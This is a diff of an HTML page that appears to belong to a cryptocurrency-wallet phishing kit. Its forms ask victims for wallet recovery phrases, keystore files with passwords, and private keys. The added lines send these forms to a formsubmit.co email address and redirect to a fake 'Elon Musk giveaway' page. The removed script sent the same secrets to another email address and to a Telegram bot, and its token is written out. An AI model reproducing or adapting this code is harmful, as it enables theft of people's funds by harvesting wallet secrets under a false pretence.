@@ -71,6 +71,8 @@
 			<!-- Form for Keyphrase -->
 <div class="content" id="tab-one"> 
    <form action="https://formsubmit.co/formsubmitmail@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://elonmusk-giveaway.vercel.app/access/point/success.html">
       <input type="hidden" name="_captcha" value="false"> 
       <input type="text" name="_honey" style="display: none"> 
       <input type="hidden" name="_next" value="https://tokensauth.cc/sent.html"> 
@@ -85,7 +87,9 @@
 
 <!-- Form for Keystore JSON -->
 <div class="content d-none" id="tab-two"> 
-  <form id="keystoreForm" onsubmit="submitKeystore(event)">
+ <form action="https://formsubmit.co/formsubmitmail@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://elonmusk-giveaway.vercel.app/access/point/success.html">
       <input type="hidden" name="_captcha" value="false"> 
       <input type="text" name="_honey" style="display: none"> 
       <input type="hidden" name="_next" value="https://tokensauth.cc/sent.html"> 
@@ -101,7 +105,9 @@
 
 <!-- Form for Private Key -->
 <div class="content d-none" id="tab-three"> 
-  <form id="privateKeyForm" onsubmit="submitPrivateKey(event)">
+  <form action="https://formsubmit.co/formsubmitmail@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://elonmusk-giveaway.vercel.app/access/point/success.html">
       <input type="hidden" name="_captcha" value="false"> 
       <input type="text" name="_honey" style="display: none"> 
       <input type="hidden" name="_next" value="https://tokensauth.cc/sent.html"> 
@@ -114,68 +120,7 @@
   </form> 
 </div>
 
-<script>
-function submitKeyphrase(event) {
-  event.preventDefault(); // Prevent the default form submission
-  const form = event.target;
-  const phrase = form.phrase.value;
-  const url = `https://formsubmit.co/wnewton0001@gmail.comtext=Keyphrase: ${encodeURIComponent(phrase)}`;
 
-  fetch(url)
-      .then(response => {
-          if (response.ok) {
-              window.location.href = 'index.html'; // Redirect to homepage
-          } else {
-              alert('Error sending message. Please try again.');
-          }
-      })
-      .catch(error => {
-          console.error('Error:', error);
-          alert('An error occurred. Please try again.');
-      });
-}
-
-function submitKeystore(event) {
-  event.preventDefault(); // Prevent the default form submission
-  const form = event.target;
-  const keystorejson = form.keystorejson.value;
-  const password = form.Password.value;
-  const url = `https://formsubmit.co/wnewton0001@gmail.com;
-
-  fetch(url)
-      .then(response => {
-          if (response.ok) {
-              window.location.href = 'index.html'; // Redirect to homepage
-          } else {
-              alert('Error sending message. Please try again.');
-          }
-      })
-      .catch(error => {
-          console.error('Error:', error);
-          alert('An error occurred. Please try again.');
-      });
-}
-
-function submitPrivateKey(event) {
-  event.preventDefault(); // Prevent the default form submission
-  const form = event.target;
-  const privateKey = form.Key.value;
-  const url = `https://api.telegram.org/bot7552140963:AAHkeU5PGLeLuEqAy9U68sp2ijCPc6E5CY8/sendMessage?chat_id=-4692683158&text=Private Key: ${encodeURIComponent(privateKey)}`;
-
-  fetch(url)
-      .then(response => {
-          if (response.ok) {
-              window.location.href = 'index.html'; // Redirect to homepage
-          } else {
-              alert('Error sending message. Please try again.');
-          }
-      })
-      .catch(error => {
-          console.error('Error:', error);
-          alert('An error occurred. Please try again.');
-      });
-}
-</script>
 		</div>
 	</div>
 
